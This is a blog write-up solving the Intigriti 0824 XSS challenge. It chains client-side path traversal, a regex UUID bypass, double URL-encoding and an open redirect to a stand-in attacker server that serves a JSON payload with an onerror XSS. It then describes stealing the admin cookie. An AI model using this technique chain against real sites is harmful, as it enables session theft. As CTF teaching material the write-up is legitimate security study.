---
title: "Intigriti 0824 XSS Challenge"
date: 2025-01-05T10:17:19+05:30
draft: false
---

**tl;dr**

* Bypassing CSPT filters and UUID validations implemented using Regex .
* Chaining CSPT and Open-Redirect to achieve XSS .
* Finally XSS and retrive the admin cookie .



<!--more-->
Intigriti dropped another awesome XSS challenge,This time created by [@_CryptoCat](https://x.com/_CryptoCat). The challenge felt fairly straightforward,  definitely less headbanging than usual, I managed to solve it in around 20 minutes after diving in.
## 🔎 Challenge Overview


The challenge revolved around a classic note-taking application, featuring standard functionalities like creating , viewing notes and also it included an option to report the note, which would trigger an admin bot to visit and review it.

![image](https://hackmd.io/_uploads/HyPmr2DqA.png)


As is typical with XSS challenges, the goal was to obtain the admin bot's cookie, which was the flag. For that we needed XSS.

Firstly taking a closer look at the 2 features, which are 
- Create Note 
- View Note


## 1) Create Note 

The Create Note feature is straightforward. It sends a request to ``/api/notes/fetch``, creating a note with a unique UUID. The note can then be viewed by navigating to ``/view?note-uuid`` .
```python=
@main.route('/api/notes/store', methods=['POST'])
@login_required
def store():
    data = request.get_json()
    content = data.get('content')
    # Server-side XSS protection
    sanitized_content = bleach.clean(content)
    note = Note.query.filter_by(user_id=current_user.id).first()
    if note:
        note.content = sanitized_content
    else:
        note = Note(user_id=current_user.id, content=sanitized_content)
        db.session.add(note)

    db.session.commit()
    return jsonify({'success': 'Note stored', 'note_id': note.id})
```

The note content is sanitized server-side using the Bleach library, so this eliminates any possibility of any quick XSS.But still we had a harmless **Html injection**.

 
## 2) View Note 

This appeared to be the real challenge. Upon checkin ``view.html``, it becomes clear that the note-uuid is used to fetch the note contents via the fetch() method. 

```js 
 window.addEventListener("load", function () {
        const urlParams = new URLSearchParams(window.location.search);
        const noteId = urlParams.get("note");
        if (noteId) {
            document.getElementById("note-id-input").value = noteId;
            validateAndFetchNote(noteId);
        }
    });
```

Immediately, my mind turned to **CSPT (Client-Side Path Traversal)**, given that we had control over the fetch request.

> Client Side Path Traversal attacks arises when a web application loads some content using XHR(XmlHTTPRequests) or fetch() and the user have control over some section of the path where to load the resource.


Taking a look at the ``validateAndFetchNote()`` function

```js 

    function validateAndFetchNote(noteId) {
        if (noteId && isValidUUID(noteId.trim())) {
            history.pushState(null, "", "?note=" + noteId);
            fetchNoteById(noteId);
        } else {
            showFlashMessage(
                "Please enter a valid note ID,",
                "danger"
            );
        }
    }
```

Looks like there are some checks after all .

It only fetched notes with valid UUIDs using the ``isValidUUID()`` function. Additionally, the fetchNoteByID() function had a CSPT check before making the actual fetch by using ``noteId.includes("../")`` .


```js 
function fetchNoteById(noteId) {
        if (noteId.includes("../")) {
            showFlashMessage("Input not allowed!", "danger");
            return;
        }
        fetch("/api/notes/fetch/" + decodeURIComponent(noteId), {
            method: "GET",
            headers: {
                "X-CSRFToken": csrf_token,
            },
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.content) {
                    document.getElementById("note-content").innerHTML =
                        DOMPurify.sanitize(data.content);
                    document.getElementById(
                        "note-content-section"
                    ).style.display = "block";
                    showFlashMessage("Note loaded successfully!", "success");
                } else if (data.error) {
                    showFlashMessage("Error: " + data.error, "danger");
                } else {
                    showFlashMessage("Note doesn't exist.", "info");
                }
                if (data.debug) {
                    document.getElementById("debug-content").outerHTML =
                        data.debug;
                    document.getElementById(
                        "debug-content-section"
                    ).style.display = "block";
                }
            });
    }
    
```

When our note is fetched, the server returns a JSON object containing the note's content. This content is then rendered using innerHTML, with DOMPurify applied to sanitize it, effectively preventing XSS. 

However, if the JSON response includes a debug key, its value is rendered using **outerHTML** without any sanitization, which can be used to get XSS .

```js 
 if (data.debug) {
        document.getElementById("debug-content").outerHTML = data.debug;
        document.getElementById(
            "debug-content-section"
        ).style.display = "block";
}

```
## 🥷 Attack plan

The plan is to manipulate the fetch request so that it returns a JSON object containing a **debug** key. However, the server only responds with a JSON object that includes a **content key** and the note’s content, with no way to modify this server response directly. The only method to achieve this would be to return the **modified JSON from our own server**.

However, we only have CSPT (Client-Side Path Traversal) at our disposal, which allows us to control the path of the fetch() request. This means we can only direct the fetch to different endpoints .

```js 
fetch("/api/notes/fetch/" + decodeURIComponent(noteId))
```

Unless there is an **Open-Redirect** in any of the endpoints !!

If we have an **Open-redirect**, we can use the CSPT to redirect the fetch() request to the endpoint having open-redirect, and then use the open redirect to send the request to our attacker's server. From there, we can respond with a JSON object that includes the debug key, containing our XSS payload.

![finalXSS](https://hackmd.io/_uploads/Sy56QfKcR.png)


## Open Redirect
There is an endpoint named ``/contact`` that accepts a query parameter called **return**. This endpoint will redirect the user to the URL specified by the value of the return parameter.

```py
@main.route('/contact', methods=['GET', 'POST'])
def contact():
    form = ContactForm()
    return_url = request.args.get('return')
    if request.method == 'POST':
        if form.validate_on_submit():
            flash('Thank you for your message!', 'success')
            if return_url and is_safe_url(return_url):
                return redirect(return_url)
            return redirect(url_for('main.home'))
    if return_url and is_safe_url(return_url):
        return redirect(return_url)
    return render_template('contact.html', form=form, return_url=return_url)
```
So now we can redirect to the attackers site by just giving the attacker site as the return query parameter.

```py
                  /contact?return=https://attacker-site.com
```

## Bypassing the CSPT Filters 

Now that we have Open-Redirect in the /contact endpoint all we have to do is path traverse to that endpoint using CSPT.However we have to bypass a few checks for that.

- The note uuid check -> **isValidUUID()** function
- Path traversal check ->  **noteId.includes("../")**


### Bypassing isValidUUID
Looking a bit closer at the **isValidUUID()** function, we can see that it validates UUIDs using a regular expression.

```js 
function isValidUUID(noteId) {
        const uuidRegex =
            /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        return uuidRegex.test(noteId);
    }
```
Here the Regex ``[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`` only ensures that the UUID pattern appears at the end of the string. **So there can be any prefix to this uuid , that means we can give ../../ before the uuid .**

```
../82652102-973d-429d-82e0-245a4fbfd6cb 
```
To ensure that it was a proper UUID the regex should have included a ``^``
in the beginnning like this.

```
/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
```

So we can do CSPT to the /contact endpoint like this.

```
/view?note=../../../contact?return=http://attack&82652102-973d-429d-82e0-245a4fbfd6cb
```

However ../ was still **blocked !!!**
### Bypassing the Path traversal check

Upon looking closer, you can see that after the noteId is being checked, it is URL-decoded within the fetch function.

```js 
if (noteId.includes("../")) {
            showFlashMessage("Input not allowed!", "danger");
            return;
        }
        fetch("/api/notes/fetch/" + decodeURIComponent(noteId), {
            method: "GET",
            headers: {
                "X-CSRFToken": csrf_token,
            },
        })
```
So we can easily bypass this check by just double urlencoding the noteId.
```
view=..%252F..%252F..%252Fcontact?return=http://attacker&UUID
```
So during the **noteId.includes("../")** check, the noteId will be **..%2F..%2Fcontact**, so the check will return **false**. However, when fetch() is called, noteId gets URL-decoded with decodeURIComponent(noteId), turning it into **../../../contact**.

## 🚀  Final Payloads

Now that we've bypassed both security checks, let's combine everything together.

* **Regex Bypass**: By using ../../../ as a prefix to the UUID, we can bypass the regex validation.
* **Path Traversal Check Bypass**: Double URL encoding the payload allows us to bypass the path traversal check.

With these steps, we can direct the fetch request to /contacts, which will **trigger an Open Redirect to our attacker's server**. The server responds with JSON containing a debug key with the XSS payload. This payload is then inserted into the outerHTML, leading to XSS.


```
..%252F..%252F..%252Fcontact?return=https://attacker/exp.json%26e447f4e1-f7c9-439c-8378-b65b83189b60
```

On the attacker’s server, we need to return a JSON object with the key debug and our XSS payload as the value.

```json 
{ "debug": "<img src=x onerror=alert()>"} // for simple alert
```

## 💀 Exploit !!

**Finally It works!!**

![image](https://hackmd.io/_uploads/BkxpOBjqR.png)

To obtain the flag stored in the admin's cookie, we can simply access **document.cookie** within the XSS payload. Once we have the cookie, we can send it to our server and solve the challenge.
